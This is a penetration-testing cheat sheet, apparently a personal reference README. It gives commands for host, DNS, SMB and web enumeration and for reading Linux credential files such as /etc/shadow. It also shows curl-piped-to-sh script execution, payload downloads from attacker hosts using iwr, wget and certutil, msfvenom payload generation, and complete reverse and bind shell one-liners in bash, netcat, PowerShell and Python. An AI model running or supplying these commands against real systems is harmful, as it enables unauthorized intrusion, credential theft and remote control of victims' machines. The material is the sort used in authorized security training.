## Scanning and Enumeration

#### NMAP
`nmap -sn IP_range`<br>
`nmap -p- -sS -iL Live_Hosts_List`<br>
`nmap -sV -sC -p Open_Ports -iL Live_Hosts_List`<br>

<img width="300" alt="NMAP_top_ports" src="https://github.com/ErvinTista/Paris/assets/13991872/85159f37-8f60-489e-b515-7a8f4c77e8d7">

#### DNS Enumeration
`host domain`<br>
`host -t mx domain`<br>
`host -t txt domain`<br>
`dnsrecon -d domain -t std`<br>
`dnsenum domain`<br>
`nslookup -type=TXT domain IP`<br>

#### TCP/UDP Port Scan
`nc -nvv -w -z IP port-port`<br>

#### SMB Enumeration
`nmap -v -p 139,445 --script smb-os-discovery IP`<br>

#### Web Enumeration
`sudo nmap -p80 --script=http-enum -sV IP` <br>
`gobuster dir -u IP -w /usr/share/wordlists/dirb/common.txt -t 5`<br>
`feroxbuster --url domain --depth 2 --wordlist /usr/share/wordlists/dirb/common.txt -x .txt,.jpg`<br>

#### Linux Enumeration
`whoami`<br>
`hostname`<br>
`id`<br>
`cat /etc/passwd`<br>
`cat /etc/shadow`<br>
`cat /etc/os-release`<br>
`uname -a`<br>
`ip a`<br>
`ifconfig`<br>
`route`<br>
`history`<br>
`netstat -ano`<br>
`crontab -l`<br>
`cat /etc/cron*`<br>
`sudo -l`<br>
`env`<br>
`cat /etc/profile`<br>
`cat /etc/bashrc`<br>
`cat ~/.bash_profile`<br>
`cat ~/.bashrc`<br>
`ps -elf`<br>
`find / -perm -u=s -type f 2>/dev/null`<br>
`find / -perm -4000 -user root -exec ls -ld {} \; 2> /dev/null`<br>
`find / -perm -u=s -type f 2>/dev/null`<br>
`curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`<br>

## Exploit

#### Password Cracking
`hashcat -a 0 -m #hash_type hash.txt dictionary_list.txt`<br>

#### Transfers
`PS iwr -uri http://attacker.IP/met.exe -Outfile met.exe`<br>
`powershell wget -Uri http://attacker_IP/name.exe -OutFile C:\destination\directory\name.exe`<br>
`certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe`<br>

## Pivoting and Tunneling

## Persistence

## Shells and One Liners
`msfvenom -p windows/x64/shell/reverse_tcp LHOST=IP.Addr.es.ss LPORT=443 -f exe -o staged_reverse_tcp.exe`

### Reverse Shells
`bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'`

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f`

`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"`

### Bind Shells
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f`

`python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'`

`powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();`

### Shell Upgrade
`python -c 'import pty; pty.spawn("/bin/bash")'`; ctrl -z; stty raw -echo; fg

## Resources and Links
|Description|Link|
|-----------|----|
|Linux Privesc|https://payatu.com/blog/a-guide-to-linux-privilege-escalation/|
|LinWinMacPEAS|https://github.com/carlospolop/PEASS-ng|
